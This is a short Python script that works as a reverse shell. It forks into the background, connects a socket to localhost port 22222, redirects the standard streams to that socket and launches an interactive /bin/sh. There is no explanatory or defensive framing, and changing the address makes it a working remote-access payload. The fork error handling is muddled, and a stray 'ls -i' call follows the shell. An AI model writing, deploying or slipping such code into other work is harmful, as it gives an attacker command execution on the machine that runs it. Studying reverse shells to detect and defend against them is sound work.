import socket
import subprocess
import os

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    if os.fork() > 0:  # windows cant use fork
        os._exit(0)

except OSError as e:
    print(f'Error in fork process: {e.errno} ({e.strerror})')
    pid = os.fork()
    if pid > 0:
        print('Fork not valid!')

socket_handler.connect(('localhost', 22222))
os.dup2(socket_handler.fileno(), 0)
os.dup2(socket_handler.fileno(), 1)
os.dup2(socket_handler.fileno(), 2)
shell_remote = subprocess.call(['/bin/sh', '-i'])
list_files = subprocess.call(['/bin/ls', '-i'])
